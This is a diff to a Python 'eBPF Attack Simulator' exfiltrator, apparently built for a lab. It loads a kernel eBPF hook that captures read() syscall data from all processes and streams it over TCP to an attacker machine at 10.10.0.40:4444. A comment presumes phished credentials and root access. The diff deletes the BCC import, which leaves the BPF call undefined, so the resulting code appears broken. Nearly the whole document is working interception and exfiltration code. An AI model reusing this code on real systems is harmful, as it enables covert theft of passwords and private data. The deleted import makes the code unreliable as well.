@@ -7,28 +7,18 @@ import time
 import signal
 from datetime import datetime
 
-# ============================================================
-# CONFIGURATION - adjust these for your lab setup
-# ============================================================
-ATTACKER_IP = "10.10.0.40"   # attacker vm
-ATTACKER_PORT = 4444          # Port receiver.py listens on
-VICTIM_IP = "10.10.0.20"      # This machine's IP (for logging)
-# ============================================================
+# The assumption with this attack is that credentials have been phished
+# make sure to run as sudo.
 
-# Try to import BCC - the Python bindings for eBPF
-try:
-    from bcc import BPF, PerfType, PerfSWConfig
-except ImportError:
-    print("[!] BCC not found. Install with: sudo apt install python3-bpfcc")
-    print("[!] Or: pip install bcc")
-    sys.exit(1)
 
-# Check we're running as root
-if os.geteuid() != 0:
-    print("[!] This must be run as root (sudo)")
-    sys.exit(1)
+# lab config
+ATTACKER_IP = "10.10.0.40"
+ATTACKER_PORT = 4444
+VICTIM_IP = "10.10.0.20"
 
-# eBPF program source - reads intercept.c from same directory
+
+
+# grabs ebpf attack file
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 BPF_SOURCE = os.path.join(SCRIPT_DIR, "intercept.c")
 
@@ -37,19 +27,19 @@ if not os.path.exists(BPF_SOURCE):
     print("[!] Make sure intercept.c is in the same directory")
     sys.exit(1)
 
-# Global socket for exfiltration
+
+# defines socket for exfil
 exfil_sock = None
 running = True
-
 def signal_handler(sig, frame):
     global running
     print("\n[*] Shutting down...")
     running = False
-
 signal.signal(signal.SIGINT, signal_handler)
 signal.signal(signal.SIGTERM, signal_handler)
 
 
+# sets up tcp copnnection
 def connect_to_attacker():
     """Establish TCP connection to the attacker's receiver"""
     global exfil_sock
@@ -67,11 +57,11 @@ def connect_to_attacker():
     return False
 
 
+# sends info to attacker machine
 def send_to_attacker(data: bytes):
     """Send intercepted data to attacker with length prefix"""
     global exfil_sock
     try:
-        # Prefix with 4-byte length so receiver knows packet boundaries
         length = struct.pack(">I", len(data))
         exfil_sock.sendall(length + data)
         return True
@@ -80,15 +70,12 @@ def send_to_attacker(data: bytes):
         connect_to_attacker()
         return False
 
-
+# formats info for send off
 def format_event(pid, uid, comm, bytes_read, data_bytes):
     """Format an intercepted event as a readable string"""
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-    # Try to decode as text, fall back to hex for binary data
     try:
         data_str = data_bytes.decode('utf-8', errors='replace').strip()
-        # Remove null bytes and non-printable chars for display
         data_str = ''.join(c if c.isprintable() else '.' for c in data_str)
     except Exception:
         data_str = data_bytes.hex()
@@ -97,34 +84,25 @@ def format_event(pid, uid, comm, bytes_read, data_bytes):
         f"[{timestamp}] "
         f"PID={pid} UID={uid} COMM={comm.decode('utf-8', errors='replace').strip(chr(0))} "
         f"BYTES={bytes_read} "
-        f"DATA={data_str[:200]}"  # truncate very long data
+        f"DATA={data_str[:200]}"
     )
 
 
 def load_and_run():
-    """Load the eBPF program and start intercepting"""
+    """This loads the ebpf attack in"""
 
     print("[*] Loading eBPF program...")
 
-    # Read the eBPF C source
+    # reads the eBPF C source
     with open(BPF_SOURCE, 'r') as f:
         bpf_source = f.read()
 
-    # Compile and load into kernel
+    # load into kernel
     try:
         b = BPF(text=bpf_source)
         print("[+] eBPF program loaded into kernel successfully")
     except Exception as e:
         print(f"[!] Failed to load eBPF program: {e}")
-        print("[!] Make sure kernel headers are installed:")
-        print("[!]   sudo apt install linux-headers-$(uname -r)")
-        sys.exit(1)
-
-    # Attach to read() syscall tracepoints
-    try:
-        print("[+] Attached to read() syscall tracepoints")
-    except Exception as e:
-        print(f"[!] Failed to attach tracepoints: {e}")
         sys.exit(1)
 
     print(f"[*] Intercepting read() syscalls on all processes...")
@@ -145,45 +123,35 @@ def load_and_run():
 
     def handle_event(cpu, data, size):
         nonlocal intercepted_count
-
-        # Cast raw data pointer to our Event struct
         event = ctypes.cast(data, ctypes.POINTER(Event)).contents
 
-        # Skip our own exfiltrator process to avoid feedback loop
+        # skips exfiltrator process to avoid feedback loop and other filtering
         if event.pid == os.getpid():
             return
-
-        # Decode process name for filtering
         comm_str = event.comm.decode('utf-8', errors='replace').strip('\x00')
-
-        # Skip noisy system processes that aren't useful for the demo
         if comm_str in ('sshd', 'sudo', 'systemd', 'python3'):
             return
-
-        # Skip tiny reads — usually internal kernel/lib noise, not real data
         if event.bytes_read < 10:
             return
 
-        # Format the intercepted event into a readable string
+        # format data to string and count interecepted
         formatted = format_event(
             event.pid,
             event.uid,
             event.comm,
             event.bytes_read,
             bytes(event.data[:event.bytes_read if event.bytes_read < 256 else 256]))
-
         intercepted_count += 1
         print(f"[INTERCEPT #{intercepted_count}] {formatted}")
 
-        # Exfiltrate the formatted event over TCP to the attacker receiver
+        # send data over TCP to the attacker receiver
         send_to_attacker(formatted.encode('utf-8'))
 
-    # Open the ring buffer and set callback
+    # open the ring buffer and set callback
     b["intercepted_data"].open_perf_buffer(handle_event)
-
     print("[+] Ring buffer opened, waiting for intercepted data...\n")
 
-    # Main loop - poll ring buffer every 100ms
+    # polls ring buffere from intercept on loop
     while running:
         try:
             b.perf_buffer_poll(100)
@@ -192,13 +160,12 @@ def load_and_run():
         except Exception as e:
             print(f"[!] Ring buffer error: {e}")
             break
-
     print(f"\n[*] Total events intercepted: {intercepted_count}")
     print("[*] Detaching eBPF program from kernel...")
     b.cleanup()
     print("[*] Done")
 
-
+# runs program
 def main():
     print("=" * 60)
     print("  eBPF Attack Simulator - Victim Side Exfiltrator")
@@ -209,15 +176,15 @@ def main():
     print(f"[*] Attacker VM: {ATTACKER_IP}:{ATTACKER_PORT}")
     print()
 
-    # Connect to attacker first
+    # checks for attack connection first
     if not connect_to_attacker():
         print("[!] Could not connect to attacker. Is receiver.py running on Kali?")
         sys.exit(1)
 
-    # Load eBPF and start intercepting
+    # starts attack and interception
     load_and_run()
 
-    # Cleanup
+    # close attacker connection
     if exfil_sock:
         exfil_sock.close()
 
